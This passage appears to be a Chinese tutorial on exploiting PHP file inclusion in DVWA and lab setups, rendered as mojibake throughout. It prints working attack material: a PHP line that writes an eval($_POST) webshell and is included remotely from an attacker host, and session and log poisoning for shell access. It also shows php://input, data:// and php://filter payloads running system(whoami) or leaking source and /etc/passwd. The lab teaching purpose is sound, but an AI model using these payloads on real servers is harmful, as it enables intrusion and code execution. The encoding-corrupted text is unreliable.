ä¸ªâ€â€¦/â€œã€‚ å¯ä»¥çœ‹æˆ‘ä¸‹é¢çš„å›¾ç‰‡ï¼Œæˆ‘åŸæœ¬åªéœ€è¦é€€ä¸‰æ¬¡å°±å¯ä»¥äº†ï¼Œè€Œæˆ‘è¿™é‡Œé€€å…«æ¬¡ä¾æ—§èƒ½è¯»å–åˆ°ï¼Œæ‰€ä»¥å°±èƒ½è¯æ˜åˆšåˆšæˆ‘æ‰€è§£é‡Šçš„ï¼Œä¸ç®¡è¾“å…¥å¤šå°‘ä¸ªâ€â€¦/\"æœ€ç»ˆåªä¼šé€€åˆ°Cç›˜ã€‚ 1.5.5 è¿œç¨‹æ–‡ä»¶è¯»å– è¿œç¨‹æ–‡ä»¶åŒ…å«å¤§æ¦‚æ„æ€åœ¨ä¹‹å‰å·²ç»æè¿‡äº†ï¼Œè¿™é‡Œå°±æ¼”ç¤ºä¸€ä¸‹æ¡ˆä¾‹ã€‚ å‰ææ¡ä»¶ï¼šç›®æ ‡æœåŠ¡å™¨çš„allow_url_fopené€‰é¡¹æ˜¯onã€‚åªæœ‰å½“è¿™ä¸ªé€‰é¡¹æ˜¯onçš„æ—¶å€™å°±èƒ½å¤Ÿä½¿ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«ä¸€å¥è¯æœ¨é©¬ã€‚ è¿™é‡Œç”¨åˆ«äººçš„æ¼”ç¤º è¿œç¨‹æ–‡ä»¶é…åˆä¸€å¥è¯æœ¨é©¬æ¡ˆä¾‹ ç½‘ç«™æœåŠ¡å™¨ï¼š192.168.10.150 æ”»å‡»è€…ä¸»æœºï¼š192.168.10.50 æ”»å‡»è€…phpä»£ç ï¼š &lt;?php fputs(fopen(\"shell.php\", \"w\"),\"&lt;?php @eval($_POST['pass']);?&gt;\")?&gt; è¿™å¥è¯çš„æ„æ€å°±æ˜¯å½“è®¿é—®è¿™ä¸ªphpä»£ç åå°±ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªshell.phpæ–‡ä»¶ï¼Œå¹¶ä¸”è¿™ä¸ªæ–‡ä»¶ä¸­å«æœ‰ä¸€å¥è¯æœ¨é©¬ã€‚ é€šè¿‡æŸ¥çœ‹æœåŠ¡å™¨ç½‘ç«™æ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå·²ç»åˆ›å»ºäº†ä¸€ä¸ªåä¸ºshell.phpçš„æ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡è¿™ä¸ªæ–‡ä»¶ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥ã€‚ é€šè¿‡ä¸Šé¢çš„å›¾ç‰‡å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸè¿æ¥äº†ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬è¿™ä¸ªåœ°å€æ˜¯çŸ¥é“çš„ï¼Œè‹¥åœ¨å®é™…ç¯å¢ƒä¸­æ“ä½œçš„æ—¶å€™å¯èƒ½éœ€è¦æ³¨æ„æŸ¥æ‰¾è·¯å¾„ã€‚ åŸºäºä¸Šé¢çš„æ–‡ä»¶åŒ…å«çš„çŸ¥è¯†èƒŒæ™¯ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä¸€ä¸ªæ”»å‡»çš„å¤§æ¦‚æ­¥éª¤ï¼š æˆ‘ä»¬å…ˆä»includeå‡½æ•°å…¥æ‰‹ï¼Œæ¥çœ‹ä¸€ä¸‹includeå‡½æ•°æœ‰ä»€ä¹ˆç‰¹æ®Šçš„åœ°æ–¹ï¼Œä¸ºæ­¤æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªå°è„šæœ¬æ¥éªŒè¯ä¸‹ã€‚ &lt;?php show_source(__FILE__); $file = $_GET['file']; include $file; ?&gt; â€‹ åœ¨éªŒè¯æ–‡ä»¶åŒ…æ¼æ´çš„æ—¶å€™æˆ‘ä»¬é€šå¸¸ä½¿ç”¨/etc/passwdæ–‡ä»¶æ˜¯å¦èƒ½å¤Ÿè¢«æˆåŠŸè¯»å–ï¼Œè¯¥æ–‡ä»¶æ˜¯æˆ‘ä»¬linuxçš„ç”¨æˆ·ç»„ä¿¡æ¯ï¼Œä¸”è¿™ä¸ªæ–‡ä»¶çš„æƒé™æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ã€‚ä¸”é‡Œé¢åŒ…å«çš„ä¿¡æ¯æ˜¯æˆ‘ä»¬å½“å‰æœåŠ¡å™¨çš„æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå±äºæ•æ„Ÿä¿¡æ¯ã€‚ ç°åœ¨æˆ‘ä»¬ç”¨è¿™ä¸ªå°è„šæœ¬éªŒè¯ä¸€ä¸‹æ˜¯å¦èƒ½å¤ŸæˆåŠŸçš„è¯»å–/etc/passwdæ–‡ä»¶ã€‚ æˆ‘ä»¬å‘ç°æˆåŠŸçš„è¯»å–äº†/etc/passwdä¸‹é¢çš„æ–‡ä»¶ã€‚ä¸‹é¢æˆ‘ä»¬æ¢ä¸€ä¸‹æˆ‘ä»¬è¦è¯»å–çš„æ–‡ä»¶ï¼Œæ¢ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶è¯•ä¸€è¯•ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆæ•ˆæœ â€‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨æŠ¥äº†ä¸ªwarningçš„é”™è¯¯,å› ä¸ºæ­¤æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿™æ­£å¥½æ˜¯includeå‡½æ•°çš„ç‰¹ç‚¹ï¼Œæ–‡ä»¶ä¸åœ¨çš„æ—¶å€™ä¼šä¸¢å‡ºwarningçš„é”™è¯¯ï¼Œç„¶åè¿˜ä¼šæ¥ç€è¿è¡Œä¸‹å»ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°†includeå‡½æ•°åˆ‡æ¢åˆ°requireå‡½æ•°ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ â€‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„includeåœ¨æ‰¾ä¸åˆ°æ–‡ä»¶çš„æƒ…å†µä¸‹ä¼šä¸¢å‡ºwarningçš„é”™è¯¯ï¼Œè€Œæˆ‘ä»¬çš„requoreå‡½æ•°ç›´æ¥ä¸¢å‡ºfailedé”™è¯¯ï¼Œç›´æ¥å°±åœæ­¢è¿è¡Œäº†ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ä¹‹å‰ä»‹ç»æˆ‘ä»¬includeå’Œrequireå‡½æ•°çš„åŒºåˆ«çš„åœ°æ–¹ã€‚ â€‹ ä¸‹é¢æˆ‘ä»¬ä»sessionæ–‡ä»¶åŒ…å«æ¥è¿›è¡Œgetshellçš„æ¼”ç¤ºï¼Œæˆ‘ä»¬å…ˆä»phpinfoçš„ä¿¡æ¯è·å–åˆ°æˆ‘ä»¬sessionçš„å­˜å‚¨ä½ç½®ï¼ˆè¿™ä¸ªä½ç½®å…¶å®æˆ‘ä»¬å¯ä»¥çŒœæµ‹åˆ°çš„ï¼Œå› ä¸ºå°±é‚£å‡ ä¸ªå›ºå®šçš„å­˜å‚¨ä½ç½®ï¼Œä¾‹å¦‚ï¼š/var/lib/php5/sessionsã€/var/lib/php7/sessionsã€/var/lib/php/sessionsç­‰ï¼‰ ps: æ¥ä¸‹æ¥å…ˆè·Ÿç€å§,æˆ‘çš„ç¯å¢ƒæ˜¯windowsçš„â€¦ ä¸ºäº†éªŒè¯sessionæ–‡ä»¶åŒ…å«æ¼æ´æˆ‘ä»¬ç¼–å†™äº†ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š &lt;?php show_source(__FILE__); session_start(); $_SESSION['PHPSESSID'] = $_GET['name']; include $_GET['file']; â€‹ æˆ‘ä»¬å…ˆæ‰“å¼€æµè§ˆå™¨è®¿é—®æ­¤æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬åœ¨æŒ‰F12é”®ï¼ŒæŸ¥çœ‹æˆ‘ä»¬çš„cookieï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬cookieä¸­æœ‰ä¸ªPHPSESSIDçš„åç§°ï¼Œå…¶ä¸­å®ƒçš„å€¼å°±æ˜¯æˆ‘ä»¬sessionidçš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦åŒ…å«çš„æ–‡ä»¶ã€‚ æˆ‘ä»¬åœ¨é€šè¿‡è¿™ä¸ªè„šæœ¬ï¼Œå‘seesionå†™å…¥æ¶æ„çš„æ•°æ® â€‹ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ‰“å¼€æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œè¿›å»æˆ‘ä»¬å­˜å‚¨sessionçš„ç›®å½•,ç„¶åæ‰¾åˆ°å¯¹åº”çš„sessionæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å†…å®¹å·²ç»æˆåŠŸå†™å…¥åˆ°æˆ‘ä»¬çš„sessioné‡Œé¢äº†ã€‚ ç„¶åæˆ‘ä»¬è®¿é—®æˆ‘ä»¬sessionæ–‡ä»¶å‘ç°æˆ‘ä»¬å†™å…¥çš„è„šæœ¬å·²ç»æˆåŠŸè¢«æ‰§è¡Œäº† æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­éªŒè¯æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æ»¡è¶³æ¡ä»¶æ‰èƒ½è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨è¯»å–æ–‡ä»¶çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æƒé™æ‰èƒ½è¯»å–ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æˆ‘ä»¬åŸæœ¬æœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶çš„æƒé™(è¿™é‡Œçœ‹åˆ«äººçš„) å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯è¯»æƒé™ä»…é€‚ç”¨äºå½“å‰ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œå…¶å®ƒç”¨æˆ·å¹¶æ²¡æœ‰å¯è¯»çš„æƒé™ã€‚ä¸ºäº†éªŒè¯æˆ‘ä»¬çš„å®éªŒï¼Œæˆ‘ä»¬å°†å…¶å®ƒç”¨æˆ·è®¾ç½®æˆå¯è¯»çš„æƒé™ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¯»å–æˆ‘ä»¬çš„æ—¥å¿—æ–‡ä»¶äº†ã€‚ â€‹ ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥æ„é€ æˆ‘ä»¬æ¶æ„çš„æ—¥å¿—ä¿¡æ¯äº†ï¼Œè¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ä¸‹ï¼Œæˆ‘ä»¬åœ¨æ„é€ æˆ‘ä»¬çš„æ—¥å¿—ä¿¡æ¯çš„æ—¶å€™ï¼Œä¸èƒ½ç›´æ¥åœ¨æµè§ˆå™¨ä¸­æ„é€ ï¼ˆåœ¨urlåé¢æ„é€ ä¿¡æ¯ï¼‰ï¼Œå› ä¸ºå¦‚æœç›´æ¥åœ¨æµè§ˆå™¨ä¸­æ„é€ ï¼Œå­˜å‚¨åˆ°æ—¥å¿—ä¿¡æ¯çš„æ—¶å€™å°±ä¼šè¿›è¡Œurlencodeç¼–ç äº†ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸èƒ½æ­£å¸¸æ„é€ æˆ‘ä»¬éœ€è¦çš„æ—¥å¿—ä¿¡æ¯ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦BurpSuiteå·¥å…·äº†ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹æ•°æ®ï¼Œè¿™æ ·å­˜å‚¨çš„æ—¥å¿—å°±ä¸ä¼šè¿›è¡Œurlencodeç¼–ç äº†ã€‚ è¿™é‡Œç”¨ç°æˆçš„å›¾ç‰‡, æˆ‘å¿˜äº†æˆªå±äº† å¯ä»¥çœ‹åˆ°å·²ç»å†™åˆ°äº†æ—¥å¿—æ–‡ä»¶ è¿™é‡Œä¸çŸ¥é“ä¸ºä½•åŒ…å«ä¸äº† 1.6æ–‡ä»¶åŒ…å«ä¹‹ä¼ªåè®®åˆ©ç”¨ file:// #è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ http:// #è®¿é—®HTTPsç½‘å€ ftp:// #è®¿é—®ftp URL php:// #è®¿é—®è¾“å…¥è¾“å‡ºæµ zlib:// #å‹ç¼©æµ data:// #æ•°æ® ssh2:// #security shell2 expect:// #å¤„ç†äº¤äº’å¼çš„æµ glob:// #æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„ phpè¯­è¨€å†…ç½®äº†å¾ˆå¤šå°è£…åè®®ï¼Œè€Œè¿™äº›åè®®åˆ™æ˜¯æˆ‘ä»¬å¤„ç†æ–‡ä»¶åŒ…å«æ¼æ´ç»å¸¸ç”¨åˆ°çš„æ–¹æ³•ï¼Œæœ€å¸¸è§çš„åè®®æœ‰ä»¥ä¸‹å‡ ç§ï¼š php://input php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚ POST è¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œæœ€å¥½ä½¿ç”¨ php://input æ¥ä»£æ›¿ $HTTP_RAW_POST_DATAï¼Œå› ä¸ºå®ƒä¸ä¾èµ–äºç‰¹å®šçš„ php.ini æŒ‡ä»¤ã€‚ è€Œä¸”ï¼Œè¿™æ ·çš„æƒ…å†µä¸‹ $HTTP_RAW_POST_DATA é»˜è®¤æ²¡æœ‰å¡«å……ï¼Œ æ¯”æ¿€æ´» always_populate_raw_post_data æ½œåœ¨éœ€è¦æ›´å°‘çš„å†…å­˜ã€‚ enctype=â€œmultipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚ æ­¤åè®®éœ€è¦allow_url_includeä¸ºonï¼Œåœ¨ä¹‹å‰ä¹Ÿå¼ºè°ƒè¿‡äº†ã€‚Inputä¼ªåè®®å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„dataéƒ¨åˆ†ï¼Œæ‰€ä»¥å®ƒæ‰èƒ½æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„æ•°æ®ã€‚ php://inputä¸»è¦æ˜¯ç”¨æ¥æ‰§è¡Œphpä»£ç çš„ï¼Œä¸è¿‡php://inputéœ€è¦ä»¥POSTæäº¤ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆåœ¨URLä¸­æ·»åŠ php://inputç„¶åæŠ“åŒ…æŠŠGETä¿®æ”¹ä¸ºPOST(ä½†å¦‚ä¸‹ä¸¤å›¾å¯ä»¥çœ‹å‡ºä¼¼ä¹ä¸å¿…æŠŠgetä¿®æ”¹ä¸ºpost)ï¼Œæœ€ååœ¨æ•°æ®åŒ…çš„æœ€åè¾“å…¥æƒ³è¦æ‰§è¡Œçš„ä»£ç å°±å¯ä»¥å®ç°ä»£ç æ‰§è¡Œã€‚ ç”¨æ³•ï¼š #URLä¸­: ?page=php://input #è¯·æ±‚æ•°æ®ä¸­ï¼š &lt;?php system(whoami);?&gt; #è¿™é‡Œæ˜¯é€šè¿‡phpä»£ç æ‰§è¡Œç³»ç»Ÿå‘½ä»¤whoami; 1ã€åœ¨æ–‡ä»¶åŒ…å«é¡µé¢ï¼Œé€šè¿‡burpsuiteæŠ“åŒ…ï¼š 2ã€ç”¨burpsuiteæŠ“åŒ…åœ¨urlä¸­è¾“å…¥php://inputï¼Œåœ¨åº•éƒ¨è¯·æ±‚æ•°æ®ä¸­å¯ä»¥å†™ä»»æ„PHPä»£ç ï¼š è·å¾—phpinfoä¿¡æ¯ï¼š 3ã€é€šè¿‡phpä»£ç æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š 4ã€å†™å…¥ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼š &lt;?php fputs(fopen('test.php','w'),'&lt;?php @eval($_POST[test]);?&gt;'); ?&gt; 5ã€é¡µé¢å‡ºç°ä¹±ç è§£å†³ï¼š åœ¨settingè®¾ç½®ä¸­å¯ä»¥æ‰¾åˆ° php://filter php://filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file()å’Œ file_get_contents()ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ php://filter å¯ä»¥åœ¨æ‰§è¡Œä»£ç å‰å°†ä»£ç æ¢ä¸ªæ–¹å¼è¯»å–å‡ºæ¥ï¼Œåªæ˜¯è¯»å–ï¼Œä¸éœ€è¦å¼€å¯ï¼Œè¯»å–æºä»£ç å¹¶è¿›è¡Œ base64 ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åš php ä»£ç æ‰§è¡Œå°±çœ‹ä¸åˆ°æºä»£ç å†…å®¹äº† åˆ©ç”¨æ¡ä»¶ï¼š åªæ˜¯è¯»å–ï¼Œæ‰€ä»¥åªéœ€è¦å¼€å¯allow_url_fopenï¼Œå¯¹allow_url_includeä¸åšè¦æ±‚ã€‚ ç”¨æ³•ï¼šphp://filter/read=convert.base64-encode/resource=è¦è¯»å–çš„æ–‡ä»¶ URLï¼šhttp://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=2.php è§£å¯†ï¼š&lt;?php phpinfo();?&gt; æˆ‘ä»¬æ¥çœ‹ä¸‹æˆ‘ä»¬ç”¨filterä¼ªåè®®è¯»å–çš„æ–‡ä»¶ï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨äº†è½¬æ¢è¿‡æ»¤å™¨ï¼Œå¯¼è‡´è¾“å‡ºçš„ç»“æœæ˜¯base64ç¼–ç çš„æ ¼å¼ base64è§£ç å¾—åˆ°flag å½“ç„¶é‡Œä¸å•å•åªèƒ½è¯»å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè¿™é‡Œå°±æ¼”ç¤ºä¸€ä¸‹å¦å¤–ä¸€ç§è¯»å–æ–¹å¼ï¼Œæˆ‘å°†æ–‡ä»¶æ”¾åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­ï¼Œé€šè¿‡phpè¿›è¡Œè¯»å–ã€‚ URLï¼šhttp://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=../2.php ä»”ç»†çœ‹URLè¿æ¥å°±èƒ½çœ‹å‡ºæ¥ï¼Œè¿™é‡Œä½¿ç”¨äº†ä¹‹å‰æåˆ°çš„ç›¸å¯¹è·¯å¾„è¯»å–ã€‚ å…¶ä¸­filterä¼ªåè®®å†…ç½®äº†å¾ˆå¤šè¿‡æ»¤å™¨ï¼Œæœ‰å­—ç¬¦ä¸²è¿‡æ»¤å™¨ï¼Œè½¬æ¢è¿‡æ»¤å™¨ã€å‹ç¼©è¿‡æ»¤å™¨ã€åŠ å¯†è¿‡æ»¤å™¨ç­‰ ç”¨æ³•ï¼š ?page=php://filter/read=convert.base64-encode/resource=file1.php 1ã€è°ƒæ•´DVWAçš„å®‰å…¨çº§åˆ«ï¼Œå¹¶è¿›å…¥æ–‡ä»¶åŒ…å«é‡Œé¢ï¼š 2ã€ä½¿ç”¨php://åè®®è¿›è¡Œæ–‡ä»¶åŒ…å«file1.phpï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå·²ç»è¿”å›äº†åŒ…å«æ–‡ä»¶çš„base64åŠ å¯†æºç ï¼š è¿™ä¸ªåè®®çš„å«ä¹‰ä¸ºï¼šé€šè¿‡phpåè®®è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶çš„æºä»£ç ï¼Œå¯¹è¯»å–çš„çš„æ–‡ä»¶è¿›è¡Œbase64åŠ å¯†ï¼Œå¹¶è¿”å›åŠ å¯†åçš„æ–‡ä»¶å†…å®¹ã€‚ è§£å¯†å¾—åˆ°æºç  4ã€é€šè¿‡ç›®å½•ç©¿è¶Šçš„æ–¹æ³•è¯»å–index.phpæ–‡ä»¶ï¼š ?page=php://filter/read=convert.base64-encode/resource=../../index.php ä¸€èˆ¬æˆ‘ä»¬æ˜¯åœ¨å·²çŸ¥ç½‘ç«™ç»“æ„è·¯å¾„çš„å‰æä¸‹ï¼Œè·å–ç½‘ç«™çš„æºä»£ç ã€‚ file:// file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ, fileå…¶å®å’Œç»å¯¹è·¯å¾„è¯»å–å·®ä¸å¤šã€‚ URLï¼šhttp://192.168.10.150/1.php/?name=file://C:/Windows/win.ini é¶åœºæºç ï¼š &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; //å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œé€šè¿‡GETçš„è¯·æ±‚æ–¹å¼æ¥æ”¶æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ï¼› // Input validation if( !fnmatch( \"file*\", $file ) &amp;&amp; $file != \"include.php\" ) { //å¦‚æœé€šè¿‡getæ–¹å¼ä¼ é€’è¿‡æ¥çš„å‚æ•°å­—ç¬¦ä¸²ä¸­ï¼Œå¼€å¤´æ²¡æœ‰ä»¥file*å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¸èƒ½åŒ…å«include.phpæ–‡ä»¶ï¼› //è¯­æ³•:fnmatch(pattern,string,flags)ï¼š //pattern å¿…éœ€ã€‚è§„å®šè¦æ£€ç´¢çš„æ¨¡å¼ï¼› //string å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ã€‚ echo \"ERROR: File not found!\"; åˆ™è¾“å‡ºæ–‡ä»¶æœªå‘ç°ï¼Œå¹¶ä¸”é€€å‡º exit; } ?&gt; æ ¡éªŒæµç¨‹ï¼šé€šè¿‡GETçš„è¯·æ±‚æ–¹å¼æ¥æ”¶åŒ…å«çš„æ–‡ä»¶--&gt;å¦‚æœé€šè¿‡getæ–¹å¼ä¼ é€’è¿‡æ¥çš„å‚æ•°å­—ç¬¦ä¸²ä¸­ï¼Œå¼€å¤´æ²¡æœ‰ä»¥file*å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¸èƒ½åŒ…å«include.phpæ–‡ä»¶--&gt;åˆ™è¾“å‡ºæ–‡ä»¶æœªå‘ç°ï¼Œå¹¶ä¸”é€€å‡º åˆ©ç”¨æ¡ä»¶ï¼š file:// ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚ ç”¨æ³•ï¼š ?page=file:///æ–‡ä»¶ç»å¯¹è·¯å¾„ 1ã€è°ƒæ•´DVWAçš„å®‰å…¨çº§åˆ«ï¼Œå¹¶è¿›å…¥æ–‡ä»¶åŒ…å«é‡Œé¢ï¼š 2ã€ä½¿ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œæ²¡æœ‰å‘ç°æ–‡ä»¶ï¼š æ³¨ï¼šé€šè¿‡ä¸Šé¢æºç æˆ‘ä»¬å‘ç°ï¼Œåªè¦ä¼ å…¥çš„å‚æ•°çš„æ²¡æœ‰ä»¥fileå¼€å¤´çš„å­—ç¬¦ï¼Œåˆ™è¾“å‡ºæ–‡ä»¶æœªå‘ç°ï¼Œå¹¶ä¸”é€€å‡ºã€‚ 3ã€è¿™é‡Œæˆ‘ä»¬é€šè¿‡file:///åè®®è¿›è¡Œç»•è¿‡ï¼Œå‘ç°å¯ä»¥è®¿é—®hostæ–‡ä»¶ï¼š æˆ‘ä»¬åŒ…å«ï¼šfile:///C:\\Windows\\System32\\drivers\\etc\\hosts http: // å…¶å®httpè¿™é‡Œçš„åˆ©ç”¨æ–¹å¼ï¼Œé™¤äº†èƒ½å¤Ÿè·³è½¬ï¼Œè¿˜èƒ½è¿›è¡Œè¿œç¨‹åŒ…å«è¿›è¡Œæ¼æ´æ‰§è¡Œã€‚ URLï¼šhttp://192.168.10.150/1.php/?name=http://www.baidu.com data: // ä»php5.2.0èµ·ï¼Œæ•°æ®æµå°è£…å™¨å¼€å§‹æœ‰æ•ˆï¼Œä¸»è¦ç”¨äºæ•°æ®æµçš„è¯»å–ã€‚å¦‚æœä¼ å…¥çš„æ•°æ®æ˜¯phpä»£ç ï¼Œå°±ä¼šæ‰§è¡Œä»»æ„ä»£ç ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„è‹¥ä½¿ç”¨dataçš„è¯éœ€è¦allow_url_include å’Œallow_url_fopenä¸ºonã€‚ åˆ©ç”¨æ¡ä»¶ï¼š å’Œphpä¼ªåè®®çš„inputç±»ä¼¼ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä½†åˆ©ç”¨æ¡ä»¶å’Œç”¨æ³•ä¸åŒã€‚ æ¡ä»¶ï¼šallow_url_fopenå‚æ•°ä¸allow_url_includeéƒ½éœ€å¼€å¯ã€‚ #ç”¨æ³•1ï¼š ?page=data:text/plain,&lt;?php æ‰§è¡Œå†…å®¹ ?&gt; #ç”¨æ³•2ï¼š ?page=data:text/plain;base64,ç¼–ç åçš„phpä»£ç  1ã€ä½¿ç”¨ç”¨æ³•1æ‰§è¡Œä»£ç ï¼š æ‰§è¡Œå†…å®¹ï¼š &lt;?php system(whoami);?&gt; 2ã€ä½¿ç”¨ç”¨æ³•2æ‰§è¡Œä»£ç ï¼š æ‰§è¡Œå†…å®¹ï¼š &lt;?php system(whoami);?&gt; æ³¨ï¼šç»base64ç¼–ç åçš„åŠ å·å’Œç­‰å·è¦æ‰‹åŠ¨çš„urlç¼–ç ï¼Œä»¥å…æµè§ˆå™¨è¯†åˆ«ä¸äº†ã€‚ å¯¹æ‰§è¡Œå†…å®¹è¿›è¡Œbase64åŠ å¯†ï¼š å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå‘½ä»¤å·²ç»æ‰§è¡ŒæˆåŠŸï¼š ftp://å’Œftps:// ftp:// â€“ ftps:// â€” è®¿é—® FTP(s) URLs zip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶ã€‚å½“ä»–ä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚ ä¸‹é¢æ˜¯é’ˆå¯¹æŸäº›å°è£…åè®®çš„åˆ©ç”¨æ–¹å¼å’Œç‰¹ç‚¹ åˆ©ç”¨æ¡ä»¶ï¼š zip://å¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„æ–‡ä»¶ã€‚ æ¡ä»¶ï¼š ä½¿ç”¨zipåè®®ï¼Œéœ€è¦å°†#ç¼–ç ä¸º%23ï¼Œæ‰€ä»¥éœ€è¦PHP çš„ç‰ˆæœ¬ &gt;=5.3.0ï¼Œè¦æ˜¯å› ä¸ºç‰ˆæœ¬çš„é—®é¢˜æ— æ³•å°†#ç¼–ç æˆ%23ï¼Œå¯ä»¥æ‰‹åŠ¨æŠŠ#æ”¹æˆ%23ã€‚ ç”¨æ³•ï¼š ?page=zip://[å‹ç¼©æ–‡ä»¶è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] 1ã€å°†é¶æœºç½‘ç«™ä¸»ç›®å½•ä¸‹çš„1.phpï¼Œå‹ç¼©æˆ1.zipå‹ç¼©åŒ…ï¼š å†…å®¹ï¼š &lt;?php phpinfo();?&gt; 2ã€é€šè¿‡zip://ä¼ªåè®®å¯¹å®ƒè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼š æ³¨ï¼šè¦æ˜¯æŠŠå‹ç¼©åŒ…çš„åç¼€æ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ compress.bzip2:// ç”¨æ³•ï¼š ?file=compress.bzip2://D:/soft/phpStudy/www/file.bz2 ã€orã€‘ ?file=compress.bzip2://./file.bz2 compress.zlib:// ?file=compress.zlib://D:/soft/phpStudy/www/file.gz ã€orã€‘ ?file=compress.zlib://./file.gz phar:// åˆ©ç”¨æ¡ä»¶ï¼š 